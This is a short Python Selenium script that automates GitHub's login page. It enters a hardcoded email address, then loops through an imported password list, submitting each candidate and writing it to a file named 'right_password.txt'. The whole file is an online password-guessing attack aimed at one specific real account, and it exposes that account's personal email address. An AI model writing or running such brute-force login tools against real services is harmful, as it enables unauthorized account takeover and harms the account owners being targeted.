from selenium import webdriver
from selenium.webdriver.common.by import By
import time
from perm import listPass


driver = webdriver.Chrome()

driver.get('https://github.com/login')

# with open('password.txt', 'r') as password_file:
#     content = password_file.readlines()
# password_list = []
# for i in content:
#     i = i.replace('\n', '')
#     password_list.append(i)



email_field = driver.find_element(By.ID, 'login_field')
email_field.clear()
email_field.send_keys('ehirimchiedozie96@yahoo.com')

correct_password = open('right_password.txt', 'w')

for password in listPass:
    password_field = driver.find_element(By.CLASS_NAME, 'js-password-field')
    password_field.clear()
    password_field.send_keys(password)
    correct_password.write(password+'\n')
    submit_field = driver.find_element(By.CLASS_NAME, 'btn-block')
    submit_field.click()

correct_password.close()

time.sleep(1200)